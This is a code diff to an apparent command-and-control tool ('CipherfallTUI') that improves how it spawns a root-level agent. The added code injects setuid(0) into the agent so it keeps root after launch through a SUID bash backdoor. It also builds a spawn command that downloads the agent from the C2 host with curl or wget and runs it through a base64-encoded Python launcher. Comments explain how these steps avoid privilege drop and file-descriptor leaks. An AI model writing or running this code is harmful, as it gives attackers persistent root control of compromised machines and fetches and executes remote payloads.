@@ -1227,6 +1227,15 @@ class CipherfallTUI(App):
             '        "user":       (lambda: __import__("pwd").getpwuid(os.geteuid()).pw_name'
             ' if hasattr(os, "geteuid") else (os.environ.get("USER") or "?"))(),',
         )
+        # When spawned via SUID bash: ruid=testuser, euid=0.  dash/bash drop euid→ruid
+        # inside shell=True subprocesses unless ruid==euid.  Fix: setuid(0) at startup
+        # so ruid=euid=0 and subprocesses keep root privileges.
+        agent_text = agent_text.replace(
+            "def main():\n    global _C2_IP\n",
+            "def main():\n    global _C2_IP\n"
+            "    if hasattr(os, 'geteuid') and os.geteuid() == 0:\n"
+            "        try:\n            os.setuid(0)\n        except OSError:\n            pass\n",
+        )
         if is_ntp:
             # NTP agent recvfrom(2048) silently truncates payloads > ~1.8 KB — AEAD tag
             # mismatch causes the command to be dropped.  Serve the baked agent via the
@@ -1238,12 +1247,26 @@ class CipherfallTUI(App):
             served_path = www_dir / served_name
             served_path.write_text(agent_text, encoding="utf-8")
             host = _C2_HOST if _C2_HOST not in ("", "0.0.0.0") else "127.0.0.1"
+            # nohup ... & inside SUID bash leaks the testuser agent's subprocess pipe
+            # write-end (bash saves FD1 at a high FD; that copy survives closerange in
+            # userspace but bypasses CLOEXEC on exec from a subshell).  Use a Python
+            # launcher that explicitly nullifies FDs 0-255 before execv-ing the agent,
+            # so the pipe write-end is closed and subprocess.run() returns immediately.
+            _launch_src = (
+                f"import os\n"
+                f"os.closerange(3,256)\n"
+                f"null=os.open('/dev/null',os.O_RDWR)\n"
+                f"os.dup2(null,0);os.dup2(null,1);os.dup2(null,2)\n"
+                f"os.close(null)\n"
+                f"os.execv('/usr/bin/python3',['/usr/bin/python3','{ra}'])\n"
+            )
+            _launch_b64 = base64.b64encode(_launch_src.encode()).decode()
             spawn_cmd = (
                 f"{bd} -p -c '"
                 f"PATH=/usr/bin:/bin:/usr/sbin:/sbin:$PATH; "
                 f"curl -sfo {ra} http://{host}/{served_name} "
                 f"|| wget -qO {ra} http://{host}/{served_name}; "
-                f"nohup python3 {ra} >/dev/null 2>&1 & echo ok'; "
+                f"printf %s {_launch_b64}|base64 -d|python3 & echo ok'; "
                 f"echo '[rootagent:spawned]'"
             )
         else:
